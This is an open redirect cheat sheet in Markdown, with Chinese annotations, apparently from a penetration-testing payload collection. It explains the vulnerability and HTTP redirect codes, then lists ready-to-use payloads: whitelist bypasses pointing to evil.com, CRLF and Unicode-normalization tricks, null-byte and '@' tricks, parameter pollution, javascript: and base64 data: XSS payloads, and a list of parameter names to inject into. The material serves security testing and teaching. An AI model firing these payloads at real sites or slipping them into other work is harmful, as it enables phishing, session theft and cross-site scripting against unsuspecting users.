<!--
 * [业务问题]: 开放重定向（Open Redirect）漏洞允许攻击者操纵 URL 参数将用户重定向到恶意网站。由于重定向 URL 中包含受信任的域名，攻击者可以利用此漏洞发起高可信度的钓鱼攻击、窃取会话令牌或绕过访问控制机制。
 * [实现逻辑]: 本文档详细介绍了开放重定向的多种绕过技术，包括白名单域名绕过、CRLF 注入、特殊字符编码（如 %E3%80%82、@、?）、参数污染以及 Unicode 规范化利用等，并提供了常见的注入参数列表和实战案例。
 -->

# Open URL Redirection (开放 URL 重定向)

> 当 Web 应用程序接受可能导致应用程序将请求重定向到不受信任输入中包含的 URL 的不受信任输入时，就可能发生未经验证的重定向和转发。通过将不受信任的 URL 输入修改为恶意站点，攻击者可能成功发起钓鱼诈骗并窃取用户凭据。由于修改后链接中的服务器名称与原始站点相同，钓鱼尝试可能具有更可信的外观。未经验证的重定向和转发攻击还可用于恶意构造一个 URL，该 URL 将通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权功能。


## 概要 (Summary)

* [Methodology](#methodology)
    * [HTTP Redirection Status Code](#http-redirection-status-code)
    * [Fuzzing](#fuzzing)
    * [Filter Bypass](#filter-bypass)
    * [Common injection parameters](#common-injection-parameters)
* [Labs](#labs)
* [References](#references)


## 方法论 (Methodology)

当 Web 应用程序或服务器使用未经验证的用户提供的输入将用户重定向到其他站点时，就会发生开放重定向漏洞。这可以允许攻击者制作一个指向易受攻击站点的链接，该链接重定向到他们选择的恶意站点。

攻击者可以在钓鱼活动、会话窃取或强制用户在未经同意的情况下执行操作中利用此漏洞。

Consider this example:
Your web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.


## HTTP Redirection Status Code

HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:

- [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
- [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
- [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
- [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
- [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
- [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header. 
- [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
- [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.


## Fuzzing

Replace `www.whitelisteddomain.tld` from *Open-Redirect-payloads.txt* with a specific white listed domain in your test case

To do this simply modify the `WHITELISTEDDOMAIN` with value `www.test.com `to your test case URL.

```powershell
WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```


## Filter Bypass

Using a whitelisted domain or keyword

```powershell
www.whitelisted.com.evil.com redirect to evil.com
```

Using CRLF to bypass "javascript" blacklisted keyword

```powershell
java%0d%0ascript%0d%0a:alert(0)
```

Using "//" & "////" to bypass "http" blacklisted keyword

```powershell
//google.com
////google.com
```

Using "https:" to bypass "//" blacklisted keyword

```powershell
https:google.com
```

Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)

```powershell
\/\/google.com/
/\/google.com/
```

Using "%E3%80%82" to bypass "." blacklisted character

```powershell
/?redir=google。com
//google%E3%80%82com
```

Using null byte "%00" to bypass blacklist filter

```powershell
//google%00.com
```

Using parameter pollution

```powershell
?next=whitelisted.com&next=google.com
```

Using "@" character, browser will redirect to anything after the "@"

```powershell
http://www.theirsite.com@yoursite.com/
```

Creating folder as their domain

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

Using "`?`" character, browser will translate it to "`/?`"

```powershell
http://www.yoursite.com?http://www.theirsite.com/
http://www.yoursite.com?folder/www.folder.com
```


Host/Split Unicode Normalization

```powershell
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com
```

XSS from Open URL - If it's in a JS variable

```powershell
";alert(0);//
```

XSS from data:// wrapper

```powershell
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

XSS from javascript:// wrapper

```powershell
http://www.example.com/redirect.php?url=javascript:prompt(1)
```


## Common injection parameters

```powershell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```


## Labs

* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## References

- [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
- [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
- [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
- [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)